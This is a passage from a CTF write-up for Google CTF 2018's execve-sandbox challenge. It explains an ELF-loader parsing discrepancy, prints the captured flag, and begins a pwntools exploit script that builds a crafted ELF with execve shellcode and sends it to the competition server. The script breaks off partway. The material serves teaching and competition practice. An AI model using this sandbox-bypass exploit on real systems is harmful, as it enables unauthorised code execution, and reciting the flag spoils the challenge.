@@ -1,0 +1,15 @@
+---
+SOURCE: livesearch
+URL: https://github.com/LevitatingLion/ctf-writeups/blob/master/google_ctf_quals_2018/pwn_283_execve_sandbox/README.md
+CHALLENGE: ctf-writeups/google_ctf_quals_2018/pwn_283_execve_sandbox/README.md at master · LevitatingLion/ctf-writeups
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: shellcode
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: execve, read
+KEY_TECHNIQUE: Writeup for ctf-writeups/google_ctf_quals_2018/pwn_283_execve_sandbox/README.md at master · LevitatingLion/ctf-writeups — shellcode exploitation technique.
+---
+y : loff_t pos = elf_ex -> e_phoff ;
+[...] /* Read in the program headers */ retval = kernel_read ( elf_file , elf_phdata , size , & pos ); Using this difference in the parsers, we can craft a custom ELF file, which has its program header table located at offset zero, to skip the ELF validation part, and directly map 0x10000 using a PT_LOAD segment. We include a small shellcode in our binary, which writes ./flag to 0x10000 and executes execve(0x10000, NULL, NULL) , and finally retrieve the flag! CTF{Time_to_read_that_underrated_Large_Memory_Management_Vulnerabilities_paper} Conclusion Although it took me several different ideas and approaches to solve this challenge, I eventually succeeded, and learned a lot about Linux' ELF loader and memory management internals on the way! I hope you enjoyed reading this writeup as much as I did writing it. Thanks to Google for organizing this great CTF! Exploit Script Last but not least, the script I used to solve the challenge: #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * exe = './flag' addr = 0x10000 def exploit (): # build the handcrafted elf elf = build_elf () # send it to the server r = remote ( 'execve-sandbox.ctfcompetition.com' , 1337 ) r . recvuntil ( 'ELF binary... \n ' ) r . send ( elf + 'deadbeef' ) # receive the flag r . interactive () def build_elf (): context . arch = 'amd64' shellcode = asm ( # copy the filename to the target address shellcraft . strcpy ( addr , addr + 0x38 * 4 ) # call execve(filename) + shellcraft . execve ( addr , 0 , 0 )
+    ) # elf header # elf magic elf = ' \x7f ELF' # elf class: 64-bit elf += p8 ( 2 ) # endianness: little endian elf += p8 ( 1 ) # elf version, usually set to 1 elf += p8 ( 1 ) # abi: linux abi elf += p8 ( 3 ) # unused elf += ' \0 ' * 8 # binary type: executable elf += p16 ( 2 ) # target architecture: x86-64 elf += p16 ( 0x3e ) # elf version, again 1 elf += p32 ( 1 ) # entry point: after the headers we place the executable name and after that the shellcode e
